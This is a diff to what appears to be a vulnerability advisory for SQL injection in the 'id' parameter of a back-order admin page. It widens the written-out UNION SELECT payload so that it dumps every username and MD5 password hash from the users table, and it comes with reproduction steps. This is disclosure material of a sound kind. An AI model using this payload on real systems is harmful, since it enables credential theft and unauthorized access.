@@ -16,7 +16,7 @@ This vulnerability allows an attacker to inject arbitrary SQL queries into the b
 By injecting the following payload into the `id` parameter:
 
 ``` SQL
--4' UNION SELECT 1,2,3,4,5,6,7,8,9,10,(SELECT group_concat(username,0x3a,password) FROM users LIMIT 0,1),12,13,14,15,16-- -
+-4' UNION SELECT 1,2,3,4,5,6,7,8,9,10,(SELECT group_concat(username,0x3a,password) FROM users),12,13,14,15,16-- -
 ```
 
 An attacker can perform a **UNION SELECT** query that returns sensitive data from the `users` table, specifically usernames and MD5 hashed passwords. This information can be easily extracted and used for unauthorized access or other malicious activities.
@@ -30,14 +30,14 @@ This exposure of user credentials, even if hashed, poses a serious security risk
 1. Login to a staff member account.
 2. Access the vulnerable page: `/sms/admin/?page=back_order/view_bo&id=4`.
 3. Modify the `id` parameter to the following payload:  
-    `-4' UNION SELECT 1,2,3,4,5,6,7,8,9,10,(SELECT group_concat(username,0x3a,password) FROM users LIMIT 0,1),12,13,14,15,16-- -`
+    `-4' UNION SELECT 1,2,3,4,5,6,7,8,9,10,(SELECT group_concat(username,0x3a,password) FROM users),12,13,14,15,16-- -`
 4. The response will contain the concatenated usernames and password hashes of users stored in the `users` table.
 
 ---
 
 #### 4. **SQL Injection Payload**
 
-`-4' UNION SELECT 1,2,3,4,5,6,7,8,9,10,(SELECT group_concat(username,0x3a,password) FROM users LIMIT 0,1),12,13,14,15,16-- -`
+`-4' UNION SELECT 1,2,3,4,5,6,7,8,9,10,(SELECT group_concat(username,0x3a,password) FROM users),12,13,14,15,16-- -`
 
 ---
 
